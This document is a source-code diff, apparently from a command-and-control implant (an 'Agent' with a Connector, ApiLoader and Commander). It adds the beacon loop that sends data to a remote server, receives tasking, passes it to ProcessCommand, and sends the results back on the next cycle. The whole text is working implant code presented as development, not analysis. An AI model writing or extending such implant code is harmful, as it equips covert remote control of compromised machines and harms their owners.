@@ -1,5 +1,6 @@
 #include "main.h"
 #include "ApiLoader.h"
+#include "Commander.h"
 #include "utils.h"
 
 Agent*         g_Agent;
@@ -37,10 +38,30 @@ void AgentMain()
 		HttpHeaders
 	);
 
-	while (true) {
-		ULONG recv_size = 0;
-		BYTE* recv = g_Connector->SendData(NULL, NULL, &recv_size);
-		Sleep( g_Agent->config->sleep_delay * 1000 + 4000 );
-	}
+	PBYTE sendData     = NULL;
+	ULONG sendDataSize = 0;
 
+	while (true)
+	{
+		ULONG recvDataSize = 0;
+		BYTE* recvData     = g_Connector->SendData( sendData, sendDataSize, &recvDataSize);
+
+		if ( sendData ) {
+			MemFreeLocal( (LPVOID*) &sendData, sendDataSize);
+			sendDataSize = 0;
+		}
+
+		if (recvDataSize > 4) {
+			Packer* data = ProcessCommand(recvData, recvDataSize);
+			if (data && data->GetDataSize() > 4) {
+
+				sendDataSize = data->GetDataSize();
+				sendData = data->GetData();
+
+				continue;
+			}
+		}
+
+		Sleep( g_Agent->config->sleep_delay * 1000);
+	}
 }
